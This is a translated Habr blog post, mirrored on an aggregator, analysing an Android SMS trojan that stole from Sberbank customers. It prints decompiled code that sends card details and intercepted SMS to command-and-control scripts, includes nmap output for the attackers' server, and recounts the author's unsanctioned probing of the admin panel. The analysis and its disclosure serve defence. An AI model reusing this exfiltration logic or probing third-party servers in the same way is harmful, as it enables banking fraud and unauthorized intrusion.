<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I shamefully deactivated the botnet</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I posted, without knowing it, the announcement on avito.ru. How many times went there! But this time somehow failed ... 
 I have long been sure that m...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I shamefully deactivated the botnet</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/a29/57a/27a/a2957a27afb570b94205f6d1e9803f9a.png" alt="image"><br><br>  I posted, without knowing it, the announcement on avito.ru.  How many times went there!  But this time somehow failed ... <br>  I have long been sure that many bad people parse telephone numbers from this site, so taxis, building materials, emergency computer help, "8-800-555-3-555 - easier to call than to borrow from someone" and invitations for the battle of psychics for me is already a familiar thing, but this time there was something new. <br><br>  An SMS message comes to me with the text: ‚ÄúI entrusted you with an advertisement how to exchange http: // ...‚Äù.  Just like that, with a missing punctuation mark and errors.  And the link downloads avito.apk.  Interesting. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  Study APK </h4><br>  Well, I thought, I should look at what this APK does.  The result of my usual bundle from apktool + dex2jar + jd-gui did not satisfy me, since  some of the classes could not be seen in the tree, although it was possible to access them through links  I decided to use the new-fashioned online sandboxes - and the decompiled code received, and information, and a pcap file with dumped traffic.  As it turned out, this file was uploaded to me, so an earlier analysis got into my hands, which was quite useful. <br><br>  So, what does this trojan: <br><ul><li>  <b>delivery &amp;&amp;&amp;</b> - sending SMS messages to numbers from the phone book with the specified text </li><li>  <b>sent &amp;&amp;&amp;</b> - sending specified SMS messages from the server </li><li>  <b>rent &amp;&amp;&amp;</b> - intercept all SMS messages and send them to the server </li><li>  <b>sms_stop &amp;&amp;&amp;</b> - cancel SMS interception </li><li>  <b>ussd &amp;&amp;&amp;</b> - USSD request </li><li>  <b>call_1 &amp;&amp;&amp;</b> - set and cancel unconditional forwarding </li></ul><br><div class="spoiler">  <b class="spoiler_title">Some code from my notes</b> <div class="spoiler_text"><pre><code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> HttpRequestBase </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { HttpPost httppost = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HttpPost(d()); ArrayList arraylist = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"bot_id"</span></span>, com.avito.aca(c()))); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"number"</span></span>, b)); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"month"</span></span>, Integer.toString(c.intValue()))); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"year"</span></span>, Integer.toString(d.intValue()))); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"cvc"</span></span>, Integer.toString(e.intValue()))); httppost.setEntity(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> UrlEncodedFormEntity(arraylist, <span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> httppost; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(UnsupportedEncodingException unsupportedencodingexception) { unsupportedencodingexception.printStackTrace(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">d</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String((<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder()).append(a).append(<span class="hljs-string"><span class="hljs-string">"set_card.php"</span></span>).toString()); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> HttpRequestBase </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { HttpPost httppost = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HttpPost(d()); ArrayList arraylist = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"id"</span></span>, com.avito.aca(b))); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"info"</span></span>, com.avito.acb(b))); httppost.setEntity(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> UrlEncodedFormEntity(arraylist, <span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> httppost; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(UnsupportedEncodingException unsupportedencodingexception) { unsupportedencodingexception.printStackTrace(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">d</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String((<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder()).append(a).append(<span class="hljs-string"><span class="hljs-string">"get.php"</span></span>).toString()); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> HttpRequestBase </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { JSONObject jsonobject = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> JSONObject(); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"text"</span></span>, c); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"number"</span></span>, d); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"date"</span></span>, e); HttpPost httppost = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HttpPost(d()); ArrayList arraylist = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"bot_id"</span></span>, com.avito.aca(b))); arraylist.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BasicNameValuePair(<span class="hljs-string"><span class="hljs-string">"sms"</span></span>, jsonobject.toString())); httppost.setEntity(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> UrlEncodedFormEntity(arraylist, <span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> httppost; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(UnsupportedEncodingException unsupportedencodingexception) { unsupportedencodingexception.printStackTrace(); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span>(JSONException jsonexception) { jsonexception.printStackTrace(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">null</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">d</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String((<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder()).append(a).append(<span class="hljs-string"><span class="hljs-string">"load_sms.php"</span></span>).toString());</code> </pre> <br></div></div><br>  In addition to these commands, the Trojan disables Wifi Sleep, tries to access the encrypted storage and set itself as an Android administrator (of course, this uses the standard OS dialogs, where you can cancel this action).  The trojan code is not obfuscated; some strings are base64 encoded.  In general, it is not clear what kind of trojan it is.  Whether it was collected by copy-paste, or it is based on some other Trojan, or something else, but it contains lines in Portuguese, German, English, Ubuntu-fonts, a form for intercepting data from the application of the German bank Commerzbank, the icon which some games and flash player. <a name="habracut"></a><br><br><h4>  Further research </h4><br>  A short link came to the SMS, which unfolded into a link to the <b>i-avito.com</b> server.  <b>After scanning</b> this server via nmap, I received another domain <b>deskdistributor.com</b> , which was in the title on the 443-port. <br><div class="spoiler">  <b class="spoiler_title">Nmap scan result</b> <div class="spoiler_text">  Starting Nmap 6.47 ( <a href="http://nmap.org/">nmap.org</a> ) at 2014-08-25 17:17 MSK <br>  NSE: Loaded 118 scripts for scanning. <br>  NSE: Script Pre-scanning. <br>  Initiating Ping Scan at 17:17 <br>  Scanning i-avito.com (91.237.198.115) [2 ports] <br>  Completed Ping Scan at 17:17, 0.07s elapsed (1 total hosts) <br>  DNS resolution of 1 host.  at 17:17 <br>  Completed Parallel DNS resolution of 1 host.  at 17:17, 0.00s elapsed <br>  Initiating Connect Scan at 17:17 <br>  Scanning i-avito.com (91.237.198.115) [1000 ports] <br>  Discovered open port 22 / tcp on 91.237.198.115 <br>  Discovered open port 993 / tcp on 91.237.198.115 <br>  Discovered open port 80 / tcp on 91.237.198.115 <br>  Discovered open port 3306 / tcp on 91.237.198.115 <br>  Discovered open port 143 / tcp on 91.237.198.115 <br>  Discovered open port 110 / tcp on 91.237.198.115 <br>  Discovered open port 21 / tcp on 91.237.198.115 <br>  Discovered open port 53 / tcp on 91.237.198.115 <br>  Discovered open port 25 / tcp on 91.237.198.115 <br>  Discovered open port 443 / tcp on 91.237.198.115 <br>  Discovered open port 587 / tcp on 91.237.198.115 <br>  Discovered open port 995 / tcp on 91.237.198.115 <br>  Discovered open port 2222 / tcp on 91.237.198.115 <br>  Completed Connect Scan at 17:17, 3.42s elapsed (1000 total ports) <br>  Initiating Service scan at 17:17 <br>  Scanning 13 services on i-avito.com (91.237.198.115) <br>  Completed Service scan at 17:17, 19.97s elapsed (13 services on 1 host) <br>  NSE: Script scanning 91.237.198.115. <br>  Initiating NSE at 17:17 <br>  Completed NSE at 17:18, 19.50s elapsed <br>  Nmap scan report for i-avito.com (91.237.198.115) <br>  Host is up (0.094s latency). <br>  Not shown: 987 closed ports <br>  PORT STATE SERVICE VERSION <br>  21 / tcp open ftp ProFTPD 1.3.4b <br>  22 / tcp open ssh OpenSSH 5.3 (protocol 2.0) <br>  |  ssh-hostkey: <br>  |  1024 59: e1: 13: d2: a5: e5: bd: 50: 27: b7: 08: 8e: d7: 42: 8d: 24 (DSA) <br>  |  2048 c3: 23: b1: 6e: fd: ce: b5: 76: 5d: 2b: 32: 8a: 47: 61: d7: 44 (RSA) <br>  | _ 256 c4: 36: 5f: c3: 31: 1d: e1: 60: 70: b2: 4e: 9b: 8e: 3e: d1: 79 (ECDSA) <br>  25 / tcp open smtp Exim smtpd 4.76 <br>  |  smtp-commands: s.ee Hello i-avito.com [95.215.45.33], SIZE 20971520, PIPELINING, AUTH PLAIN LOGIN, STARTTLS, HELP, <br>  | _ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP <br>  |  ssl-cert: Subject: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Issuer: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Public Key type: rsa <br>  |  Public Key bits: 1024 <br>  |  Not valid before: 2011-07-19T08: 56: 59 + 00: 00 <br>  |  Not valid after: 2038-12-03T08: 56: 59 + 00: 00 <br>  |  MD5: 7ca0 14bc e517 e437 b49c aca7 17cc fbc6 <br>  | _SHA-1: 77bc fd19 856a a562 f719 604a 0461 2093 b012 5405 <br>  | _ssl-date: 2014-08-25T13: 18: 58 + 00: 00;  + 1m10s from local time. <br>  53 / tcp open domain <br>  |  dns-nsid: <br>  | _ bind.version: 9.8.2rc1-RedHat-9.8.2-0.23.rc1.el6_5.1 <br>  80 / tcp open http Apache httpd 2 <br>  | _http-methods: No Allow or Public header in OPTIONS response (status code 302) <br>  |  http-title: 404 Not Found <br>  | _Requested resource was 91.237.198.115/avito.apk <br>  110 / tcp open pop3 Dovecot DirectAdmin pop3d <br>  | _pop3-capabilities: UIDL RESP-CODES USER AUTH-RESP-CODE TOP SASL (PLAIN) CAPA PIPELINING STLS <br>  143 / tcp open imap Dovecot imapd <br>  | _imap-capabilities: post-login have LOGIN-REFERRALS ENABLE ID IDLE IMAP4rev1 Pre-login more AUTH = PLAINA0001 LITERAL + OK SASL-IR capabilities listed STARTTLS <br>  443 / tcp open ssl / http apache httpd 2 <br>  | _http-methods: OPTIONS GET HEAD POST <br>  | _http-title: Secured Home of deskdistributor.com <br>  |  ssl-cert: Subject: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = US <br>  |  Issuer: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = US <br>  |  Public Key type: rsa <br>  |  Public Key bits: 1024 <br>  |  Not valid before: 2014-06-27T11: 21: 26 + 00: 00 <br>  |  Not valid after: 2041-11-11T11: 21: 26 + 00: 00 <br>  |  MD5: 5987 e508 bab7 b23c 16a7 2822 53f5 2ae2 <br>  | _SHA-1: d6f2 1c00 dcea f10c c049 02ed 2058 0376 619d eb60 <br>  | _ssl-date: 2014-08-25T13: 18: 57 + 00: 00;  + 1m09s from local time. <br>  587 / tcp open smtp Exim smtpd 4.76 <br>  |  smtp-commands: s.ee Hello i-avito.com [95.215.45.33], SIZE 20971520, PIPELINING, AUTH PLAIN LOGIN, STARTTLS, HELP, <br>  | _ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA NOOP QUIT RSET HELP <br>  |  ssl-cert: Subject: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Issuer: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Public Key type: rsa <br>  |  Public Key bits: 1024 <br>  |  Not valid before: 2011-07-19T08: 56: 59 + 00: 00 <br>  |  Not valid after: 2038-12-03T08: 56: 59 + 00: 00 <br>  |  MD5: 7ca0 14bc e517 e437 b49c aca7 17cc fbc6 <br>  | _SHA-1: 77bc fd19 856a a562 f719 604a 0461 2093 b012 5405 <br>  | _ssl-date: 2014-08-25T13: 18: 57 + 00: 00;  + 1m10s from local time. <br>  993 / tcp open ssl / imap Dovecot DirectAdmin imapd <br>  | _imap-capabilities: have LOGIN-REFERRALS ENABLE ID IDLE IMAP4rev1 Pre-login more AUTH = PLAINA0001 LITERAL + post-login SASL-IR capabilities listed OK <br>  |  ssl-cert: Subject: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Issuer: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Public Key type: rsa <br>  |  Public Key bits: 1024 <br>  |  Not valid before: 2011-07-19T08: 56: 59 + 00: 00 <br>  |  Not valid after: 2038-12-03T08: 56: 59 + 00: 00 <br>  |  MD5: 7ca0 14bc e517 e437 b49c aca7 17cc fbc6 <br>  | _SHA-1: 77bc fd19 856a a562 f719 604a 0461 2093 b012 5405 <br>  | _ssl-date: 2014-08-25T13: 18: 57 + 00: 00;  + 1m10s from local time. <br>  995 / tcp open ssl / pop3 Dovecot DirectAdmin pop3d <br>  | _pop3-capabilities: AUTH-RESP-CODE SASL (PLAIN) CAPA TOP UIDL RESP-CODES PIPELINING USER <br>  |  ssl-cert: Subject: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Issuer: commonName = localhost / organizationName = none / stateOrProvinceName = Someprovince / countryName = GB <br>  |  Public Key type: rsa <br>  |  Public Key bits: 1024 <br>  |  Not valid before: 2011-07-19T08: 56: 59 + 00: 00 <br>  |  Not valid after: 2038-12-03T08: 56: 59 + 00: 00 <br>  |  MD5: 7ca0 14bc e517 e437 b49c aca7 17cc fbc6 <br>  | _SHA-1: 77bc fd19 856a a562 f719 604a 0461 2093 b012 5405 <br>  | _ssl-date: 2014-08-25T13: 18: 57 + 00: 00;  + 1m09s from local time. <br>  2222 / tcp http http DirectAdmin httpd 1.33.6 (Registered to superb) <br>  | _http-favicon: Unknown favicon MD5: 3AE13A3A9C0634B29A2667DCFFC69D87 <br>  | _http-methods: No Allow or Public header in OPTIONS response (status code 404) <br>  | _http-title: DirectAdmin Login <br>  3306 / tcp open mysql MySQL 5.5.31 <br>  |  mysql-info: <br>  |  Protocol: 53 <br>  |  Version: .5.31 <br>  |  Thread ID: 63436701 <br>  |  Capabilities flags: 63487 <br>  |  Some Capabilities: SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, Support41Auth, ODBCClient, ti, tsh, tlc, octltDTelTableColumn, InteractiveClient, Support41Auth, ODBCClient, tsh, octlTDTectColumn <br>  |  Status: Autocommit <br>  | _ Salt:! [, D7 # H "o.2Q" T ^^?] 9B <br>  Service Info: Host: s.ee;  OS: Unix <br><br>  NSE: Script Post-scanning. <br>  Initiating NSE at 17:18 <br>  Completed NSE at 17:18, 0.00s elapsed <br>  Read data files from: /usr/bin/../share/nmap <br>  Service detection performed.  Please report any incorrect results at <a href="http://nmap.org/submit/">nmap.org/submit</a> . <br>  Nmap done: 1 IP address (1 host up) scanned in 43.49 seconds <br></div></div><br>  A quick search on the Internet gave a few more domains: <b>m-avito.com</b> , <b>m-avito.net</b> (176.119.3.51), <b>m-avito.info</b> (91.237.198.115), and searching on whois-data, found another suspicious domain <b>1host .name</b> (94.242.227.67), which is a stub rather than an informational site.  The virus itself refers to the domain <b>jewelrycover.com</b> (91.237.198.124), which was probably either overbought or the botnet administrator took control of it using <a href="https://www.facebook.com/permalink.php%3Fstory_fbid%3D408150299308434%26id%3D408147072642090">phishing</a> . <br><br>  After examining the pcap files received from the sandboxes and with my own hand, I found the full link to CnC and the format of the data sent and sent to the server.  The mobile device with a certain time interval addressed the get.php script, each time transmitting its ID created by counting the MD5 hash from IMEI, the country, the name of the telephone operator, the Android version and the phone model, and in response either received or not got the command.  If a device received a command, a notification was sent to the server at set_result.php with the device ID and the command name.  The load_sms.php script sent all incoming SMS. <br><br>  At the time of the virus research, it was set up to steal money from Sberbank‚Äôs customers using mobile SMS banking, and only once did I receive a command from the server to send a link to the virus to the first address from the device‚Äôs address book. <br><br>  First of all, the server sent the rent &amp;&amp;&amp; command to receive all the SMS messages coming to the device.  Then an INFO message was sent to number 900 - the number of Sberbank's mobile bank.  Information about client cards was transmitted to the server.  Then, the server sent the sent &amp;&amp;&amp; command with a request for a balance about each card.  Then the team was sent either to transfer money to the savings bank account (8,000 rubles), or to replenish the account to MTS subscribers (3,000 rubles). <br><br>  In general, what happened was described in a recent article about the method of stealing money from Sberbank clients, but automated. <br>  The server did not send other commands.  If the server received a response to an INFO request that the owner of the device is not a Sberbank client, no further responses were received from the server. <br><div class="spoiler">  <b class="spoiler_title">Example of communication with the server</b> <div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/1b8/21c/7df/1b821c7df29567d4238193db28bbf438.png" alt="image"><br><img src="https://habrastorage.org/getpro/habr/post_images/cff/f11/467/cfff11467626809609d5454ee7cd093d.png" alt="image"><br><img src="https://habrastorage.org/getpro/habr/post_images/7a0/74e/e11/7a074ee11dbf419a81f27220283d25a6.png" alt="image"><br><img src="https://habrastorage.org/getpro/habr/post_images/058/399/fa9/058399fa903bc864acf55e1e22f01182.png" alt="image"><br><img src="https://habrastorage.org/getpro/habr/post_images/8a4/8f7/0e2/8a48f70e2b5d247807913d3c0c3fe72e.png" alt="image"><br></div></div><br><br><h4>  Fun </h4><br>  I wrote a small <a href="http://youtu.be/jEiGCWa2_eA%3Ft%3D2m44s">script</a> that emulates the behavior of the bot.  And somehow the thought crept into my head that, with a high probability, there are vulnerabilities in the admin panel.  I did not manage to find any SQL injections, and I decided to insert a sniffer picture into all transmitted values: in the name of the operator, in the name of the device model, in the notification of the executed command, in the SMS text, well, you understand.  Nothing happened. <br><br>  I ran the scripts in a loop in order to collect more phone numbers of attackers. <br><div class="spoiler">  <b class="spoiler_title">Numbers intruders</b> <div class="spoiler_text">  Sberbank numbers: <br>  9687792866 8000 <br>  9050391955 8000 <br>  9061153023 8000 <br>  9663455177 8000 <br>  9050253473 8000 <br>  9672215694 8000 <br>  9663455125 8000 <br>  9663455180 8000 <br>  9050384603 8000 <br>  9687792852 8000 <br><br><br>  MTS numbers: <br>  9877251451 3000 <br>  9877251519 3000 <br>  9877298049 3000 <br>  9877299230 3000 <br>  9877298819 3000 <br>  9877298775 3000 <br>  9818915169 3000 <br>  9877299466 3000 <br>  9117187631 3000 <br>  9877251259 3000 <br>  9873389680 3000 <br>  9198360569 3000 <br>  9873389735 3000 <br>  9873389737 3000 <br>  9873389766 3000 <br>  9877251151 3000 <br>  9198227849 3000 <br>  9877251169 3000 <br>  9877251851 3000 <br>  9877251136 3000 <br>  9877251226 3000 <br>  9877251227 3000 <br>  9877154758 3000 <br>  9877154761 3000 <br>  9877154752 3000 <br>  9877154756 3000 <br>  9818895780 3000 <br>  9818742776 3000 <br>  9818740837 3000 <br>  9818770491 3000 <br>  9877154765 3000 <br>  9877154825 3000 <br>  9818742764 3000 <br>  9877154773 3000 <br>  9818894379 3000 <br>  9818770342 3000 <br>  9818770523 3000 </div></div><br>  I continued scanning servers and searching for vulnerabilities.  There were phpmyadmin and squirrelmail, however, vulnerabilities could not be found in them.  And here, quite by chance, the server fell.  Pages did not open, pings did not go.  I opened the sniffer, and what do I see !? <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e78/12a/a1a/e7812aa1ae123a8a70434035bf68aed9.png" alt="image"><br><br>  It happened two hours before shutting down the server.  If I monitored the sniffer more often, I would get access to the admin panel, because  sniffer caught and referer that led to it.  Most likely, some data was screened, and some - no, and the administrator, seeing the screened data and realizing that his IP was compromised, decided to retire. <br><br>  So I shamefully deactivated the botnet.  You can officially spread rot and humiliate me. <br><br><h4>  PS </h4><br>  The scammers' numbers were transferred to Sberbank‚Äôs security service, the IP address was transferred to Beeline‚Äôs security service, hosters are written as abuse. <br>  <a href="http://rghost.ru/57696207">Trojan itself, another one, source code, pcap files and nmap results for free without SMS</a> . </div><p>Source: <a href="https://habr.com/ru/post/234663/">https://habr.com/ru/post/234663/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../234653/index.html">Optimize Linux for the desktop and games</a></li>
<li><a href="../234655/index.html">How we tracked marriage in the real world and debugged the production of board games</a></li>
<li><a href="../234657/index.html">Looking for black holes and supernovae with the Black Holes web app.</a></li>
<li><a href="../234659/index.html">EU has banned some e-commerce tricks</a></li>
<li><a href="../234661/index.html">BitTorrent Sync 1.4 Released</a></li>
<li><a href="../234673/index.html">tSqlt - unit testing in Sql Server</a></li>
<li><a href="../234677/index.html">How to accept credit card payments - Badoo experience</a></li>
<li><a href="../234679/index.html">We connect Arduino to the electric power meter</a></li>
<li><a href="../234681/index.html">Cisco Systems has released mobile network exams</a></li>
<li><a href="../234683/index.html">Hyperlapse: shooting accelerated video with image stabilization on a smartphone</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>